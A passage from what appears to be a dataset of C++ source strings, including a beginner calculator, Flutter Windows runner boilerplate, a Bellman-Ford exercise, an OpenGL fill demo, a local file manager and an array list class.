__WATCOMC__ =",
    "#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nint main() {\r\n    char choice;\r\n    double num1, num2;\r\n    do {\r\n        cout << \"Enter first number: \";\r\n        cin >> num1;\r\n\r\n        cout << \"Enter second number: \";\r\n        cin >> num2;\r\n\r\n        cout << \"Arithmetic Menu:\" << endl;\r\n        cout << \"1. Addition\" << endl;\r\n        cout << \"2. Subtraction\" << endl;\r\n        cout << \"3. Multiplication\" << endl;\r\n        cout << \"4. Division\" << endl;\r\n\r\n     }\r\n\r\n     while(choice == 'y'|| choice == 'Y');\r\n     cout<< \"Exit the program\"<< endl;\r\n\r\n    return 0;\r\n\r\n\r\n       switch(choice){\r\n         case 1:\r\n          cout<<\"Result:\" << \"num1 + num2\" <<endl;\r\n          break;\r\n\r\n           case 2:\r\n          cout<<\"Result:\" << \"num1 - num2\" <<endl;\r\n          break;\r\n\r\n           case 3:\r\n          cout<<\"Result:\" << \"num1 * num2\" <<endl;\r\n          break;\r\n\r\n           case 4:\r\n            if(num2 ==0){\r\n              cout<<\"Result:\" << \"The second integer is zero ,divide by zero.\"<<endl;\r\n        }\r\n        else{\r\n            cout<<\"Result:\"<< num1/num2 <<endl;\r\n\r\n        }\r\n        break;\r\n           default:\r\n            cout <<\"invalid choie ! please chooce again.\"<< endl;\r\n        }\r\n\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"search_bloc\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <bits/stdc++.h>\r\nusing namespace std;\r\n\r\nconst int N = 1e3+10; \r\nconst int INF = 1e9+10; \r\n  \r\nvector<pair<int,int>> graph[N]; \r\n\r\nvector<int> dist(N,INF);\r\nmap<int,pair<int,int>> nodeStore;\r\nstack<int> path;\r\n\r\nbool visDFS[N]; \r\nstack<int> stackDFS;\r\n\r\nvoid dfs(int vertex){ \r\n\r\n  if(visDFS[vertex]) \r\n    return; \r\n  //cout << \"vertex: \" << vertex << endl;   \r\n  visDFS[vertex] = true;  \r\n\r\n  for(auto child : graph[vertex]){ \r\n    //cout << \"par: \" << vertex << \" child: \" << child.first << endl;\r\n    dfs(child.first); \r\n  }    \r\n  \r\n  stackDFS.push(vertex);\r\n} \r\n\r\nvoid relax(int v, int child_v,int wt){\r\n    if(dist[v] + wt < dist[child_v]){\r\n      dist[child_v] = dist[v] + wt;\r\n      nodeStore[child_v] = {v,wt};\r\n    }\r\n}\r\n\r\nvoid bellmanFord (int source, int nodeNum, int edgeNum){\r\n  \r\n  for(int i=1 ; i<=nodeNum ; i++){\r\n    nodeStore[i] = {404,404};\r\n  }\r\n  \r\n  nodeStore[source] = {-1,0};\r\n  dist[source] = 0;\r\n  \r\n  for(int i=0 ; i<edgeNum-1 ; i++){\r\n    for(int j=1 ; j<=nodeNum ; j++){\r\n      for(auto child : graph[j]){\r\n        int child_v = child.first;\r\n        int wt = child.second;\r\n  \r\n        relax(j,child_v,wt);\r\n      }\r\n    }\r\n    \r\n  }\r\n}\r\n  \r\n  \r\nint main() { \r\n    int node,edge; \r\n    cin >> node >> edge; \r\n     \r\n    int v1,v2,wt; \r\n    for(int i=0 ; i<edge ; i++){ \r\n      cin >> v1 >> v2 >> wt; \r\n      \r\n      graph[v1].push_back({v2,wt});\r\n    } \r\n  \r\n    for(int i=1 ; i<=node ; i++){  \r\n      cout << i << \" : \";  \r\n      for(int j=0 ; j<graph[i].size() ; j++){  \r\n            cout << graph[i][j].first << \" \";  \r\n      }  \r\n      cout << endl;  \r\n    } \r\n    \r\n    int source,dest,weightSum=0;\r\n    \r\n    cin >> source >> dest;\r\n    \r\n    bellmanFord(source,node,edge);\r\n    \r\n    for(int i=1 ; i<=node ; i++){\r\n      if(!visDFS[i])\r\n        dfs(i);\r\n    }\r\n    \r\n    cout << \"topologically sorted order: \";\r\n    while(!stackDFS.empty()){\r\n      cout << stackDFS.top() << \" \";\r\n      stackDFS.pop();\r\n    }\r\n    cout << endl << endl;\r\n    \r\n    // for(auto it: nodeStore){\r\n    //   cout << it.first << \" e jaite \" << it.second.first << \" theke weight \" << it.second.second << endl;\r\n    // }\r\n    \r\n    if(nodeStore[dest].first == 404){\r\n      cout << endl << \"not possible to go from \" << source << \" to \" << dest << endl;\r\n    }\r\n    else{\r\n      while(nodeStore[dest].first != -1){\r\n          weightSum += nodeStore[dest].second;\r\n          //cout << nodeStore[dest].second << \" \";\r\n          path.push(dest);\r\n          dest = nodeStore[dest].first;\r\n      }\r\n      path.push(source);\r\n      \r\n      while(!path.empty()){\r\n        cout << \" \" << path.top() << \" ->\";\r\n        path.pop();\r\n      }\r\n      cout << \">| \" << endl;\r\n      \r\n      cout << \"total path weight: \" << weightSum << endl;\r\n    }\r\n} \r\n\r\n/*\r\n8 11\r\n4 5 1\r\n4 3 2\r\n4 8 5\r\n5 2 3\r\n5 1 1\r\n8 5 2\r\n8 3 2\r\n3 1 -3\r\n3 6 3\r\n1 7 -5\r\n7 6 4\r\n4 6\r\n*/\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n",
    "#include \"cached_runner.h\"\n#include \"task_runner.h\"\n// TODO: \ud544\uc694\ud55c \ud568\uc218 \uad6c\ud604\n\nCachedRunner::CachedRunner(Cache &cache) : cache_(cache), hits_(0), misses_(0) {}\n\n// \ud30c\uc77c\uc758 \uc22b\uc790\ub97c \uc804\ubd80 \uacf1\ud558\uc5ec \ubc18\ud658\ud55c\ub2e4\ndouble CachedRunner::multiply(std::string filename)\n{\n    double value;\n    if (cache_.get(\"multiply(\" + filename + \")\", value) == true)\n    {\n        hits_++;\n    }\n    else\n    {\n        value = TaskRunner::multiply(filename);\n        cache_.add(\"multiply(\" + filename + \")\", value);\n        misses_++;\n    }\n    return value;\n}\n// \ud30c\uc77c\uc5d0\uc11c \uac00\uc7a5 \uae34 \ud330\ub9b0\ub4dc\ub86c\uc744 \ucc3e\uc544 \uc778\ub371\uc2a4\ub97c \ubc18\ud658\ud55c\ub2e4\nint CachedRunner::palindrome(std::string filename)\n{\n    int value;\n    if (cache_.get(\"palindrome(\" + filename + \")\", value) == true)\n    {\n        hits_++;\n    }\n    else\n    {\n        value = TaskRunner::palindrome(filename);\n        cache_.add(\"palindrome(\" + filename + \")\", value);\n        misses_++;\n    }\n    return value;\n}\n\n// \uce90\uc2dc\uc5d0 \ud788\ud2b8\ud55c \ud69f\uc218\ub97c \ubc18\ud658\ud55c\ub2e4\nint CachedRunner::hits() { return hits_; }\n// \uce90\uc2dc\uc5d0 \ubbf8\uc2a4\ud55c \ud69f\uc218\ub97c \ubc18\ud658\ud55c\ub2e4\nint CachedRunner::misses() { return misses_; }",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"shopping_cart\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<iostream>\n#include<GL/glut.h>\nusing namespace std;\n\nvoid myInit() {\n\tglClearColor(1.0, 1.0, 1.0, 0);\n\tglColor3f(0.0, 0.0, 0.0);\n\tglPointSize(1.0);\n\tglMatrixMode(GL_PROJECTION);\n\tgluOrtho2D(0, 640, 0, 480);\n}\n\nvoid boundaryFill(float x, float y, float* b, float* n) {\n\tfloat color[3];\n\tglReadPixels(x, y, 1.0, 1.0, GL_RGB, GL_FLOAT, color);\n\tif((color[0] != b[0] || color[1] != b[1] || color[2] != b[2]) && (color[0] != n[0] || color[1] != n[1] || color[2] != n[2])) {\n\t\tglColor3f(n[0], n[1], n[2]);\n\t\tglBegin(GL_POINTS);\n\t\t\tglVertex2d(x, y);\n\t\tglEnd();\n\t\tglFlush();\n\t\tboundaryFill(x + 1, y, b, n);\n\t\tboundaryFill(x - 2, y, b, n);\n\t\tboundaryFill(x, y + 1, b, n);\n\t\tboundaryFill(x, y - 2, b, n);\n\t\tboundaryFill(x + 1, y + 1, b, n);\n\t\tboundaryFill(x + 1, y - 1, b, n);\n\t\tboundaryFill(x - 1, y + 1, b, n);\n\t\tboundaryFill(x - 1, y - 1, b, n);\n\t}\n}\n\nvoid floodFill(float x, float y, float *b, float *n) {\n\tglColor3f(0.0, 0.0, 0.0);\n\tglBegin(GL_LINE_LOOP);\n\tglVertex2d(40, 440);\n\tglVertex2d(600, 440);\n\tglColor3f(0.0, 1.0, 1.0);\n\tglVertex2d(600, 40);\n\tglVertex2d(40, 40);\n\tglEnd();\n\tfloat color[3];\n\tglReadPixels(x, y, 1.0, 1.0, GL_RGB, GL_FLOAT, color);\n\tif(color[0] == b[0] && color[1] == b[1] && color[2] == b[2]) {\n\t\tglColor3f(n[0], n[1], n[2]);\n\t\tglBegin(GL_POINTS);\n\t\t\tglVertex2d(x, y);\n\t\tglEnd();\n\t\tglFlush();\n\t\tfloodFill(x + 1, y, b, n);\n\t\tfloodFill(x - 2, y, b, n);\n\t\tfloodFill(x, y + 1, b, n);\n\t\tfloodFill(x, y - 2, b, n);\n\t\tfloodFill(x + 1, y + 1, b, n);\n\t\tfloodFill(x + 1, y - 1, b, n);\n\t\tfloodFill(x - 1, y + 1, b, n);\n\t\tfloodFill(x - 1, y - 1, b, n);\n\t}\n}\n\nvoid myDisplay() {\n\tglClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n\tglLineWidth(3);\n\tglPointSize(2);\n\tglColor3f(0.0, 0.0, 0.0);\n\tglBegin(GL_LINE_LOOP);\n\tglVertex2d(40, 440);\n\tglVertex2d(600, 440);\n\tglVertex2d(600, 40);\n\tglVertex2d(40, 40);\n\tglEnd();\n\tglFlush();\n}\n\nvoid mouse(int btn, int state, int x, int y) {\n\ty = 480 - y;\n\tif(btn == GLUT_LEFT_BUTTON) {\n\t\tif(state == GLUT_DOWN) {\n\t\t\tfloat b[] = {0, 0, 0};\n\t\t\tfloat n[] = {1, 0, 0};\n\t\t\tboundaryFill(x, y, b, n);\n\t\t}\n\t} else if(btn == GLUT_RIGHT_BUTTON) {\n\t\tif(state == GLUT_DOWN) {\n\t\t\tfloat b[3];\n\t\t\tglReadPixels(x, y, 1.0, 1.0, GL_RGB, GL_FLOAT, b);\n\t\t\tcout << b[0] << b[1] << b[2];\n\t\t\tfloat n[] = {1, 0, 0};\n\t\t\tfloodFill(x, y, b, n);\n\t\t}\n\t}\n}\n\nint main(int argc, char ** argv) {\n\tcout << (\"Left Mouse Button: Boundary Fill Right Mouse Button: Flood Fill\");\n\tglutInit(&argc,argv);\n\tglutInitDisplayMode(GLUT_SINGLE | GLUT_RGB);\n\tglutInitWindowSize(640,480);\n\tglutInitWindowPosition(100,100);\n\tglutCreateWindow(\"Filling\");\n\tmyInit();\n\tglutMouseFunc(mouse);\n\tglutDisplayFunc(myDisplay);\n\tglutMainLoop();\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"stateful_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\r\n#include <string>\r\n#include <windows.h>\r\n#include <fstream>\r\n#include <filesystem>\r\n\r\nusing namespace std;\r\n\r\nbool createDirectory(const std::string& folderName) \r\n{\r\n    if (CreateDirectoryA(folderName.c_str(), nullptr) || GetLastError() == ERROR_ALREADY_EXISTS) \r\n        return true;\r\n    \r\n    return false;\r\n}\r\n\r\nvoid createFileInDirectory(const std::string& directory, const std::string& fileName,std::string &content)\r\n{\r\n    std::string directoryPath = \"C:\\\\Users\\\\Sara\\\\Desktop\\\\Code_Alpha\\\\File_Manager\\\\\"+ directory;  //put the path of your file in the pc\r\n    std::string filePath = directoryPath + \"\\\\\" + fileName;\r\n    std::ofstream outputFile(filePath);\r\n\r\n    if (outputFile.is_open())\r\n    {\r\n        cout << \"File created successfully in directory: \" << directory << endl;\r\n        outputFile << content;\r\n        outputFile.close();\r\n    }\r\n    else \r\n    {\r\n        cout << \"Unable to create the file in directory: \" << directory << endl;\r\n    }   \r\n}\r\n\r\nvoid ReadFile(const std::string &directory,const std::string& inputFile)\r\n{\r\n    std::string directoryPath = \"C:\\\\Users\\\\Sara\\\\Desktop\\\\Code_Alpha\\\\File_Manager\\\\\" + directory;\r\n    std::string filePath = directoryPath + \"\\\\\" + inputFile;\r\n    std::ifstream inputFileStream(filePath);\r\n\r\n    if (inputFileStream.is_open())\r\n    {\r\n       cout << \"\\nContent of the file:\\n\";\r\n\r\n        std::string line;\r\n        while (std::getline(inputFileStream, line)) \r\n        {\r\n            cout << line << '\\n';\r\n        }\r\n        inputFileStream.close();\r\n    }\r\n    else \r\n    {\r\n        cout << \"Unable to open the file for reading.\\n\";\r\n    }\r\n}\r\n\r\nvoid CopyFile(const string& directory1, const string& directory2, const string& file1, const string& file2)\r\n{\r\n    fstream f1, f2;\r\n    string ch;\r\n\r\n    string filePath1 = \"C:\\\\Users\\\\Sara\\\\Desktop\\\\Code_Alpha\\\\File_Manager\\\\\" + directory1 + \"\\\\\" + file1;\r\n\r\n    f1.open(filePath1, ios::in);\r\n\r\n    if (!f1.is_open()) {\r\n        cout << \"Error opening source file: \" << filePath1 << endl;\r\n        return;\r\n    }\r\n\r\n    string filePath2 = \"C:\\\\Users\\\\Sara\\\\Desktop\\\\Code_Alpha\\\\File_Manager\\\\\" + directory2 + \"\\\\\" + file2;\r\n\r\n    f2.open(filePath2, ios::out);\r\n\r\n    if (!f2.is_open()) {\r\n        cout << \"Error opening destination file: \" << filePath2 << endl;\r\n        f1.close();\r\n        return;\r\n    }\r\n\r\n    while (getline(f1, ch))\r\n    {\r\n        f2 << ch << endl;\r\n    }\r\n\r\n    f1.close();\r\n    f2.close();\r\n\r\n    f2.open(filePath2, ios::in);\r\n\r\n    while (getline(f2, ch))\r\n    {\r\n        cout << ch << endl;\r\n    }\r\n\r\n    f2.close();\r\n}\r\n\r\nvoid MoveFile(const string& sourceDirectory, const string& destinationDirectory, const string& sourceFile, const string& destinationFile)\r\n{\r\n    fstream sourceFileStream, destinationFileStream;\r\n    string line;\r\n\r\n    string sourceFilePath = \"C:\\\\Users\\\\Sara\\\\Desktop\\\\Code_Alpha\\\\File_Manager\\\\\" + sourceDirectory + \"\\\\\" + sourceFile;\r\n\r\n    sourceFileStream.open(sourceFilePath, ios::in);\r\n\r\n    if (!sourceFileStream.is_open()) {\r\n        cout << \"Error opening source file: \" << sourceFilePath << endl;\r\n        return;\r\n    }\r\n\r\n    string destinationFilePath = \"C:\\\\Users\\\\Sara\\\\Desktop\\\\Code_Alpha\\\\File_Manager\\\\\" + destinationDirectory + \"\\\\\" + destinationFile;\r\n\r\n    destinationFileStream.open(destinationFilePath, ios::out);\r\n\r\n    if (!destinationFileStream.is_open()) {\r\n        cout << \"Error opening destination file: \" << destinationFilePath << endl;\r\n        sourceFileStream.close();\r\n        return;\r\n    }\r\n\r\n    while (getline(sourceFileStream, line))\r\n    {\r\n        destinationFileStream << line << endl;\r\n    }\r\n\r\n    sourceFileStream.close();\r\n    destinationFileStream.close();\r\n\r\n    if (remove(sourceFilePath.c_str()) != 0) {\r\n        cout << \"Error deleting source file: \" << sourceFilePath << endl;\r\n    }\r\n    else {\r\n        cout << \"File moved successfully.\" << endl;\r\n    }\r\n}\r\n\r\n\r\nint main()\r\n{\r\n    int choice;\r\n\r\n    do\r\n    {\r\n        cout << \"Which operation do you perform: \" << endl;\r\n        cout << \"1) Create Directory\" << endl;\r\n        cout << \"2) Create File in a Directory\" << endl;\r\n        cout << \"3) Read File\" << endl;\r\n        cout << \"4) Move File\" << endl;\r\n        cout << \"5) Copy File\" << endl;\r\n        cout << \"Enter 0 to Exit\" << endl;\r\n        cout << \"Enter your option\" << endl;\r\n        cin >> choice;\r\n        cin.ignore();\r\n\r\n        if(choice==1)\r\n        {\r\n            string directory_name;\r\n            cout << \"Enter the name of the directory\" << endl;\r\n            std::getline(std::cin, directory_name);\r\n            createDirectory(directory_name);\r\n           \r\n        }\r\n        else if(choice ==2)\r\n        {\r\n            string directory_name;\r\n            cout << \"Enter the name of the directory\" << endl;\r\n            std::getline(std::cin, directory_name);\r\n            string file_name;\r\n            cout << \"Enter the name of the file\" << endl;\r\n            cin >> file_name;\r\n            std::string content=\"i am c",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"arrayListType.h\"\n//---------------------\n// Implementation\n//---------------------\n\nbool arrayListType::isEmpty() const\n{\n  return (length == 0);\n} //end isEmpty\n\nbool arrayListType::isFull() const\n{\n  return (length == maxSize);\n} //end isFull\n\nint arrayListType::listSize() const\n{\n  return length;\n} //end listSize\n\nint arrayListType::maxListSize() const\n{\n  return maxSize;\n} //end maxListSize\n\nbool arrayListType::isItemAtEqual(int location, int item)  const\n{\n  if (location < 0 || location >= length)\n  {\n    std::cout << \"The location of the item to be removed \"\n      << \"is out of range.\\n\";\n\n    return false;\n  }\n  else\n    return (list[location] == item);\n} //end isItemAtEqual\n\nvoid arrayListType::removeAt(int location)\n{\n  if (location < 0 || location >= length)\n    std::cout << \"The location of the item to be removed \"\n    << \"is out of range.\\n\";\n  else\n  {\n    for (int i = location; i < length - 1; i++)\n      list[i] = list[i + 1];\n\n    length--;\n  }\n} //end removeAt\n\nvoid arrayListType::retrieveAt(int location, int& retItem) const\n{\n  if (location < 0 || location >= length)\n    std::cout << \"The location of the item to be retrieved is \"\n    << \"out of range\\n\";\n  else\n    retItem = list[location];\n} //end retrieveAt\n\nvoid arrayListType::clearList()\n{\n  length = 0;\n} //end clearList\n\narrayListType::arrayListType(int size)\n{\n  if (size <= 0)\n  {\n    std::cout << \"The array size must be positive. Creating \"\n      << \"an array of the size 100.\\n\";\n\n    maxSize = 100;\n  }\n  else\n    maxSize = size;\n\n  length = 0;\n\n  list = new int[maxSize];\n  //std::cout << \"constructor of alt: \" << this << \"\\n\"; // testing\n} //end constructor\n\narrayListType::~arrayListType()\n{\n  delete[] 